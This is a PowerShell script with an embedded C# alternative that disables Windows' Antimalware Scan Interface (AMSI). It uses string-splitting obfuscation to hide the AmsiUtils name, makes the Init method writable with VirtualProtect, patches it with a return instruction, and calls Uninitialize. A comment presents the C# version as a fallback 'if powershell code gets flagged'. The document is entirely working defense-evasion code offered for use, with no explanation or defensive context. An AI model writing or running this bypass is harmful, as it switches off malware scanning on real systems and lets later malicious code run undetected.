
$lib = @"
using System;
using System.Runtime.InteropServices;

public class lib {
	[DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $lib

$theclass = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') 
$InitMethod = $theclass | Where-Object Name -eq Init
$UninitMethod = $theclass | Where-Object Name -eq Uninitialize
$initPtr = $InitMethod.MethodHandle.GetFunctionPointer()
$p = 0
[lib]::VirtualProtect($initPtr, [uint32]1, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $initPtr, 1)
$uninitMethod.Invoke($null, $null)

# ------------------------------------------------------------------------------------------- End of ps code
<#
//c# code to be compiled into dll if powershell code gets flagged

using System;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.InteropServices;

public static class TrollAMSI3
{
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool VirtualProtectEx( IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Main()
    {
        var theclass = typeof(PSObject).Assembly.GetType("System.Management.Automation.AmsiUtils");
        IntPtr themethodPtr = theclass.GetMethod("Init", BindingFlags.Static | BindingFlags.NonPublic).MethodHandle.GetFunctionPointer();

        uint flOldProtect;
        VirtualProtectEx((IntPtr)(-1), themethodPtr, (IntPtr)1, 0x40, out flOldProtect);
        Marshal.Copy(new byte[] { 0xC3 }, 0, themethodPtr, 1);
       
        theclass.GetMethod("Uninitialize", BindingFlags.Static | BindingFlags.NonPublic).Invoke(null, null);

    }
}

#>
